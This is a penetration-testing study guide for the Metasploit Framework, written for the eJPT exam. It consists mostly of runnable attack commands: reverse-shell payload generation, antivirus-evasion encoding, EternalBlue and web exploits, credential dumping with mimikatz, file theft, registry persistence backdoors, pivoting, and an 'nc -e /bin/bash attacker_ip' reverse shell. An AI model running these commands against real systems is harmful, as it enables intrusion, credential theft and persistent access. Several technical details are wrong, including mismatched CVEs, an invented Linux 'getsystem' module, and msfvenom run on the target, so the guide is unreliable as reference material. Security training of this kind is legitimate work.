# Metasploit Framework (MSF)

## Overview

Metasploit Framework is the world's most used penetration testing platform. It's an open-source exploitation framework used to develop, test, and execute exploits against target systems. For eJPT, Metasploit is essential for:

- **Automated exploitation** of known vulnerabilities
- **Payload generation** for gaining shell access
- **Post-exploitation** modules for privilege escalation
- **Session management** across multiple compromised systems
- **Encoding/obfuscation** to bypass security controls

Metasploit integrates with other tools (nmap, sqlmap) and provides a structured approach to exploitation that mirrors real-world penetration testing workflows.

## Installation & Setup

### CachyOS/Arch Linux Installation

```bash
# Install Metasploit Framework from AUR
yay -S metasploit

# Or use pacman if packaged
sudo pacman -S metasploit

# Verify installation
msfconsole -v

# Initialize database (required on first run)
msfdb init

# Start msfconsole
msfconsole
```

### Windows Installation

```powershell
# Option 1: Windows Subsystem for Linux (WSL2)
# Follow Arch Linux instructions above

# Option 2: Native Windows (older versions only)
# Download from: https://www.metasploit.com/download
# Not recommended - use WSL2 or Docker instead

# Option 3: Docker
docker pull metasploitframework/metasploit-framework:latest
docker run -it --rm metasploitframework/metasploit-framework:latest msfconsole
```

### Database Setup (Critical)

```bash
# Initialize PostgreSQL database
msfdb init

# Verify database is running
msfdb status

# If database fails to start
systemctl start postgresql
msfdb delete  # Clear corrupted database
msfdb init    # Reinitialize

# Connect msfconsole to database
msfconsole    # Automatically connects if database is running
```

## Core Concepts

### Metasploit Architecture

```
┌─────────────────────────────────────────┐
│        METASPLOIT FRAMEWORK             │
├─────────────────────────────────────────┤
│  Modules (Exploits, Payloads, etc.)    │
│  ├── Exploits (1000+)                  │
│  ├── Payloads (100+)                   │
│  ├── Encoders (Obfuscation)            │
│  ├── Post-Exploitation                 │
│  └── Auxiliary (Scanning, fuzzing)     │
├─────────────────────────────────────────┤
│  Handlers & Session Management          │
├─────────────────────────────────────────┤
│  PostgreSQL Database                    │
└─────────────────────────────────────────┘
```

### Key Terminology

| Term | Definition |
|------|-----------|
| **Exploit** | Code that takes advantage of a vulnerability |
| **Payload** | Code executed after exploit succeeds (meterpreter shell, reverse shell, etc.) |
| **Handler** | Listener that catches callbacks from deployed payloads |
| **Module** | Plugin component (exploit, payload, encoder, auxiliary) |
| **Session** | Active connection to compromised target after successful exploitation |
| **Meterpreter** | Advanced payload providing interactive shell with extended capabilities |
| **Encoder** | Obfuscates payload to bypass antivirus/IDS detection |
| **Post Module** | Runs on compromised system for privilege escalation, data extraction, etc. |

### Meterpreter vs. Regular Shells

| Feature | Meterpreter | Regular Shell |
|---------|-----------|---------------|
| **Channels** | Multiple simultaneous | Single |
| **Stealth** | In-memory execution | Disk-based executable |
| **Migration** | Can inject into other processes | N/A |
| **Encryption** | Built-in TLS/SSL | Plain text |
| **Built-in Commands** | 100+ including file ops, registry | Limited OS commands |
| **Time** | Faster, optimized | Slower, OS dependent |

## Common Use Cases

### 1. Basic Exploitation Workflow

**Scenario**: You've identified Apache 2.4.49 vulnerability and need shell access.

```bash
msfconsole

# Search for Apache exploit
search apache 2.4.49

# Use specific exploit
use exploit/multi/http/apache_mod_cgi_bash_env_exec

# View required options
show options

# Set target
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444

# Run exploit
exploit
```

**Expected Output**:
```
[+] Sending stage (1445 bytes) to 192.168.1.100
[*] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.100:54321)
meterpreter >
```

### 2. Multi-Handler (Catching Reverse Shells)

**Scenario**: You've generated a standalone payload and need to catch the connection.

```bash
msfconsole

# Set up handler
use exploit/multi/handler

# Configure for your payload type
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# Start listening
exploit -j  # -j = run in background job

# Interact with session when target connects
sessions -i 1
```

### 3. Generating Standalone Payloads

**Scenario**: Target system doesn't have direct network access. Generate payload on attacker machine.

```bash
# Generate Windows meterpreter reverse shell
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f exe -o payload.exe

# Generate Linux meterpreter reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f elf -o payload

# Generate encoded payload (bypass antivirus)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -e x86/shikata_ga_nai -i 3 \
  -f exe -o payload_encoded.exe

# Generate web shell
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f raw -o shell.php
```

### 4. Post-Exploitation Enumeration

**Scenario**: You have shell access and need to enumerate system for privilege escalation.

```bash
# In meterpreter session
meterpreter > sysinfo
meterpreter > getuid
meterpreter > ps  # List processes
meterpreter > ipconfig  # Network configuration

# Check privileges
meterpreter > getprivs

# Load post-exploitation scripts
meterpreter > load powershell
meterpreter > powershell_shell
PS > Get-LocalUser
PS > Get-LocalGroupMember -Group "Administrators"
```

### 5. Privilege Escalation with AutoPriv

**Scenario**: Exploit runs as low-privilege user; need to escalate to SYSTEM/root.

```bash
# In meterpreter session
meterpreter > run post/linux/escalate/getsystem
# or
meterpreter > run post/windows/escalate/ms16_032

# If automated doesn't work, manually exploit
meterpreter > use post/linux/privilege_escalation/pkexec
meterpreter > set SESSION 1
meterpreter > exploit
```

### 6. Dumping Credentials

**Scenario**: Extract password hashes from compromised Windows system.

```bash
# In meterpreter session
meterpreter > load kiwi
meterpreter > creds_all

# Alternative: hashdump
meterpreter > run post/windows/gather/hashdump

# Dump LSASS for more credentials
meterpreter > load mimikatz
meterpreter > mimikatz_command -m "sekurlsa::logonpasswords"
```

### 7. File Extraction

**Scenario**: Steal sensitive files from target system.

```bash
# Download files
meterpreter > download /etc/passwd /tmp/passwd
meterpreter > download c:\\windows\\system32\\config\\sam /tmp/sam

# Search for files
meterpreter > search -f "*.sql"
meterpreter > search -f "*.conf"

# Upload files
meterpreter > upload /tmp/malware.exe c:\\temp\\
```

### 8. Creating Persistence

**Scenario**: Maintain access even after reboot or user logout.

```bash
# In meterpreter session (Windows)
meterpreter > run persistence -X -i 60 -p 4444 -r 192.168.1.50

# Linux persistence
meterpreter > run persistence -X -i 60 -p 4444 -r 192.168.1.50

# Manual registry modification (Windows)
meterpreter > reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\Run
meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\Run -v "Svchost" -d "c:\\windows\\temp\\svchost.exe"
```

### 9. Network Reconnaissance from Compromised Host

**Scenario**: Pivot to internal network from compromised system.

```bash
# From meterpreter session
meterpreter > run arp_scanner -r 192.168.1.0/24
meterpreter > run tcp_portscan -rhosts 192.168.1.0/24 -ports 22,80,443,3306

# Or use auxiliary modules
meterpreter > background
msf > use auxiliary/scanner/smb/smb_version
msf > set RHOSTS 192.168.1.0/24
msf > run
```

### 10. Reverse Shell from Web Shell

**Scenario**: Uploaded web shell; now convert to meterpreter session.

```bash
# First, get reverse shell via web shell or PHP execution
# nc -e /bin/bash attacker_ip 4444

# Meanwhile, set up handler
msfconsole
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
```

### 11. Integrating nmap Results

**Scenario**: Use nmap scan results to quickly target vulnerable services.

```bash
# Export nmap XML
nmap -sV --script vuln -oX scan.xml 192.168.1.100

# Import into Metasploit
db_import scan.xml

# View hosts
hosts
services

# Search and exploit based on nmap findings
search type:exploit platform:windows smb
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [IP from services list]
exploit
```

### 12. Encoding Payloads for AV Bypass

**Scenario**: Generated payload flagged by antivirus. Need to encode/obfuscate.

```bash
# Single encoding iteration
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -e x86/shikata_ga_nai \
  -f exe -o payload.exe

# Multiple encoding iterations
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \
  -f exe -o payload.exe

# Chain multiple encoders
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -e x86/shikata_ga_nai \
  -e x86/jmp_call_additive \
  -f exe -o payload.exe
```

### 13. Automating Exploitation with Resource Scripts

**Scenario**: Run complex multi-step exploitation sequence automatically.

```bash
# Create exploit.rc resource script
cat > exploit.rc << 'EOF'
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
EOF

# Run resource script
msfconsole -r exploit.rc
```

### 14. Session Management

**Scenario**: Multiple exploits running; need to manage active sessions.

```bash
msfconsole

# List all sessions
sessions

# Interact with specific session
sessions -i 1

# Run commands in background
sessions -c "whoami" -i 1

# Kill inactive session
sessions -k 1

# Create new shell from meterpreter
meterpreter > shell
cmd > whoami
cmd > exit
meterpreter >
```

### 15. Meterpreter Advanced Commands

**Scenario**: Once in meterpreter, leverage advanced post-exploitation features.

```bash
# File system operations
meterpreter > pwd
meterpreter > ls -la
meterpreter > cd /tmp
meterpreter > mkdir backup
meterpreter > cat /etc/shadow

# Process operations
meterpreter > ps aux
meterpreter > kill 1234
meterpreter > execute -f /bin/bash -i

# Network operations
meterpreter > ifconfig
meterpreter > netstat
meterpreter > route

# Registry operations (Windows)
meterpreter > reg query HKLM\\Software\\Microsoft\\Windows\\Run
meterpreter > reg set HKLM\\Software key value
```

## Command Reference

### msfconsole Main Commands

| Command | Description | Example |
|---------|-----------|---------|
| `search` | Find exploits/modules | `search apache 2.4.49` |
| `use` | Select module | `use exploit/windows/smb/ms17_010` |
| `show options` | Display module options | `show options` |
| `set` | Set module variable | `set RHOSTS 192.168.1.100` |
| `unset` | Clear variable | `unset RHOSTS` |
| `setg` | Set global variable | `setg LHOST 192.168.1.50` |
| `exploit` | Run exploit | `exploit` or `run` |
| `exploit -j` | Run in background | `exploit -j` |
| `check` | Test if target vulnerable | `check` |
| `info` | Show module details | `info` |
| `sessions` | Manage sessions | `sessions -i 1` |
| `handler` | Manage listeners | `use exploit/multi/handler` |
| `db_import` | Import scan results | `db_import nmap.xml` |
| `hosts` | List discovered hosts | `hosts` |
| `services` | List discovered services | `services` |
| `workspace` | Manage workspaces | `workspace -l` |
| `exit` | Exit msfconsole | `exit` |

### msfvenom Payload Generation

| Syntax | Purpose |
|--------|---------|
| `-p [PAYLOAD]` | Select payload type |
| `-f [FORMAT]` | Output format (exe, elf, php, raw, etc.) |
| `-e [ENCODER]` | Encode payload for AV bypass |
| `-i [N]` | Encoder iterations |
| `LHOST=[IP]` | Attacker listening IP |
| `LPORT=[PORT]` | Attacker listening port |
| `-o [FILE]` | Output filename |

### Common Payloads

| Payload | Target | Shell Type |
|---------|--------|-----------|
| `windows/meterpreter/reverse_tcp` | Windows | Meterpreter |
| `linux/x86/meterpreter/reverse_tcp` | Linux x86 | Meterpreter |
| `linux/x64/meterpreter/reverse_tcp` | Linux x64 | Meterpreter |
| `windows/shell/reverse_tcp` | Windows | cmd.exe |
| `linux/x86/shell/reverse_tcp` | Linux | bash |
| `php/meterpreter/reverse_tcp` | PHP targets | Meterpreter |
| `java/meterpreter/reverse_tcp` | Java targets | Meterpreter |

### Common Encoders

| Encoder | Platform | Use Case |
|---------|----------|----------|
| `x86/shikata_ga_nai` | x86 Windows | Strong polymorphic encoding |
| `x86/jmp_call_additive` | x86 Windows | Additional obfuscation layer |
| `x64/xor` | x64 Windows | Simple XOR encoding |
| `cmd/powershell_base64` | Windows | PowerShell encoding |

## Practical Workflows

### Workflow 1: Complete Target Exploitation

**Goal**: Discover vulnerable service, exploit, escalate privileges, maintain access.

```bash
# Step 1: Network reconnaissance
nmap -sV --script vuln -oX scan.xml 192.168.1.100

# Step 2: Import into Metasploit
msfconsole
db_import scan.xml
services  # View discovered services

# Step 3: Search for matching exploit
search type:exploit smb ms17_010
use exploit/windows/smb/ms17_010_eternalblue

# Step 4: Configure and exploit
set RHOSTS 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit

# Step 5: Post-exploitation
meterpreter > sysinfo
meterpreter > getuid
meterpreter > run post/windows/escalate/ms16_032
meterpreter > run post/windows/gather/hashdump

# Step 6: Maintain persistence
meterpreter > run persistence -X -i 60 -p 4444 -r 192.168.1.50
```

### Workflow 2: Web Application Exploitation

**Goal**: Exploit web vulnerability, gain shell, extract database.

```bash
# Step 1: Identify web vulnerability (from nikto/burp)
# Apache with PHP, RCE possible via file upload

# Step 2: Generate PHP payload
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f raw -o shell.php

# Step 3: Set up handler
msfconsole
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j

# Step 4: Upload payload via vulnerability
# Use browser, curl, or Burp to upload shell.php

# Step 5: Trigger shell
# Navigate to: http://192.168.1.100/uploads/shell.php

# Step 6: In meterpreter session
meterpreter > shell
php > mysql -u root -p -e "SELECT * FROM users"
php > exit
meterpreter > download /var/www/html/config.php
```

### Workflow 3: Credential Harvesting & Cracking

**Goal**: Extract hashes, crack with John, escalate to admin.

```bash
# Step 1: Get shell access (via any method)
# Already have meterpreter session

# Step 2: Dump password hashes
meterpreter > run post/windows/gather/hashdump
# or
meterpreter > load mimikatz
meterpreter > mimikatz_command -m "sekurlsa::logonpasswords"

# Step 3: Save hashes
# Copy hash output to: hashes.txt

# Step 4: Crack with John (on attacker machine)
john --format=NT hashes.txt
# or with wordlist
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Step 5: Use cracked credentials
meterpreter > run exploit/windows/local/bypassuac_eventvwr
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "DOMAIN\\Administrator"
```

## Real-World Examples

### Example 1: EternalBlue Exploitation (CVE-2017-0144)

**Scenario**: Target running Windows 7 without patches; EternalBlue vulnerability present.

```bash
msfconsole

# Search for EternalBlue
search eternalblue

# Use the exploit
use exploit/windows/smb/ms17_010_eternalblue

# Check required options
show options

# Required:
set RHOSTS 192.168.1.105
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# Optional: Set target (0 = auto, or specify Windows version)
show targets
set TARGET 0

# Run
exploit

# Expected session
[+] 192.168.1.105:445 - The target is vulnerable.
[*] 192.168.1.105:445 - Connecting to target...
[+] 192.168.1.105:445 - Target connected.
[*] Payload sent, waiting for meterpreter session.
[*] Meterpreter session 1 opened
```

### Example 2: Apache ModCGI RCE (CVE-2017-15715)

**Scenario**: Apache 2.4.49 web server with CGI script vulnerability.

```bash
msfconsole

search "Apache mod_cgi bash"
use exploit/multi/http/apache_mod_cgi_bash_env_exec

set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444
set TARGETURI /cgi-bin/test.sh

exploit

# Resulting meterpreter shell
meterpreter > sysinfo
Computer    : webserver
OS          : Linux 5.10.0
Architecture: x64
System Language : en_US
Logged In As : nobody
Meterpreter : x86/linux
```

### Example 3: Struts2 RCE (CVE-2017-5638)

**Scenario**: Apache Struts 2 vulnerable to RCE via OGNL injection.

```bash
msfconsole

search "struts2" type:exploit
use exploit/multi/http/struts_code_exec_showcase

set RHOSTS 192.168.1.101
set LHOST 192.168.1.50
set LPORT 4444
set TARGETURI /struts2-showcase/

exploit
```

### Example 4: PostgreSQL Authentication Bypass

**Scenario**: PostgreSQL with default credentials accessible.

```bash
msfconsole

use auxiliary/scanner/postgres/postgres_login
set RHOSTS 192.168.1.102
set USERNAME postgres
set PASSWORD postgres
set DATABASE template1

run

# If successful
use auxiliary/admin/postgres/postgres_sql
set DATABASE template1
set QUERY "SELECT * FROM pg_user;"
run
```

## Advanced Techniques

### Technique 1: Multi-Stage Exploitation

Create small initial payload that downloads larger meterpreter.

```bash
# Stage 1: Small executable that downloads stage 2
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f exe -s 10000 -o stage1.exe

# Benefits: Bypasses size restrictions, reduces AV detection signatures
```

### Technique 2: Polymorphic Encoding

Encode payload multiple times with different encoders.

```bash
# Create encoder chain
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -e x86/shikata_ga_nai -i 7 \
  -e x86/jmp_call_additive -i 3 \
  -f exe -o payload_polymorphic.exe
```

### Technique 3: Session Routing (Pivoting)

Route traffic through compromised system to access internal network.

```bash
# In meterpreter session on first compromise
meterpreter > background

# Set up route
msf > route add 192.168.2.0 255.255.255.0 1

# Now can scan internal network through compromised host
msf > use auxiliary/scanner/smb/smb_version
msf > set RHOSTS 192.168.2.0/24
msf > run

# Exploit internal systems through the route
msf > use exploit/windows/smb/ms17_010_eternalblue
msf > set RHOSTS 192.168.2.50
msf > exploit
```

### Technique 4: Process Migration (Stealth)

Move meterpreter to different process to avoid detection.

```bash
meterpreter > ps

PID   PPID  Name               Arch  Session  User
---   ----  ----               ----  -------  ----
1234  1000  svchost.exe        x64   0        NT AUTHORITY\SYSTEM
5678  1000  explorer.exe       x64   1        user

# Migrate to explorer.exe (less suspicious)
meterpreter > migrate 5678

[*] Migrating from 1234 to 5678...
[+] Successfully migrated to process 5678
```

### Technique 5: Custom Shellcode Injection

Load custom shellcode for advanced exploitation.

```bash
# Generate shellcode
msfvenom -p windows/exec CMD="calc.exe" \
  -f c -o shellcode.txt

# Use in meterpreter
meterpreter > shell
C:\> msfvenom -p windows/exec CMD="net user hacker password /add" \
  -f exe -o adduser.exe
```

## Tips & Tricks

### Tip 1: Quick Access to Global Variables

```bash
# Use setg to set once, apply to all modules
setg RHOSTS 192.168.1.50
setg LHOST 192.168.1.50
setg LPORT 4444

# Now these are pre-filled for every module
```

### Tip 2: One-Liner Exploitation

```bash
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.100; set LHOST 192.168.1.50; exploit"
```

### Tip 3: Resource Script Automation

```bash
# Create reusable scripts for common tasks
cat > scan_and_exploit.rc << 'EOF'
db_nmap -sV --script vuln 192.168.1.0/24
hosts -c address,os_name
services -c host,port,name,state
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
exploit -j
EOF

msfconsole -r scan_and_exploit.rc
```

### Tip 4: Encoding Multiple Times Increases Bypass Rate

```bash
# Higher iterations = more AV evasion but slower payload
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 \
  -f exe -o bypass.exe
```

### Tip 5: Session Background & Foreground

```bash
# Background current session
meterpreter > background

# List all sessions
msf > sessions

# Interact with specific session
msf > sessions -i 1

# Run command without interactive shell
msf > sessions -c "whoami" -i 1
```

### Tip 6: Kill Hanging Sessions

```bash
msf > sessions -k 1  # Kill session 1
msf > sessions       # Verify it's gone
```

### Tip 7: Database Cleanup

```bash
# Clear old database (if corrupted)
msfdb delete
msfdb init

# Or restart PostgreSQL
systemctl restart postgresql
```

### Tip 8: Check if Target is Vulnerable Before Exploiting

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
check  # Verify vulnerability without executing
```

## Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| `Database error - cannot connect` | PostgreSQL not running | `msfdb start` or `systemctl start postgresql` |
| `Module not found` | Metasploit not updated | `msfconsole --update` or `git pull` in MSF directory |
| `Handler not catching shell` | Port blocked/wrong LHOST | Verify firewall, use different port, check LHOST IP |
| `Payload fails silently` | Target doesn't match payload arch | Verify target is x86/x64, use correct payload |
| `Session dies immediately` | Payload unstable or killed | Try different payload, add persistence |
| `Exploit hangs on "Connecting"` | Network/firewall issue | Check connectivity with ping/nmap first |
| `Cannot access Windows registry` | Insufficient privileges | Run getsystem, try privilege escalation |
| `AV detects payload` | Signature known | Use encoders, change file extension, split binary |
| `msfvenom not found` | Metasploit not in PATH | Full path: `/usr/share/metasploit-framework/msfvenom` |
| `Encoding failed` | Payload too large | Use different encoder, reduce iterations |

## Official Resources

- **Main Documentation**: https://docs.metasploit.com/
- **Exploit Database**: https://www.exploit-db.com/
- **Module Browser**: https://www.rapid7.com/products/metasploit/
- **GitHub Repository**: https://github.com/rapid7/metasploit-framework
- **CVE Integration**: https://www.cvedetails.com/

## Key Takeaways

1. **Metasploit automates exploitation** - Allows testing multiple vulnerabilities rapidly without manual coding
2. **Database integration** - Import nmap/Nessus scans to correlate vulnerabilities with exploits
3. **Multi-stage payloads** - Smaller initial payload downloads full meterpreter, bypasses size restrictions
4. **Session management** - Multiple simultaneous sessions across different targets from single console
5. **Post-exploitation** - Built-in modules for privilege escalation, credential harvesting, persistence
6. **AV evasion** - Encoders/obfuscation reduce detection rates significantly
7. **Persistence mechanisms** - Automatically create backdoors for continued access post-compromise
8. **Resource scripts** - Automate complex exploitation sequences for repeatability
9. **Process migration** - Evade detection by injecting into legitimate processes
10. **Routing & pivoting** - Compromise first target, use as springboard for internal network access

---

**Next Steps**: Integrate Metasploit results with post-exploitation modules covered in Phase 3. Use `04_PIVOTING/01_pivoting_tunneling.md` for multi-system scenarios.
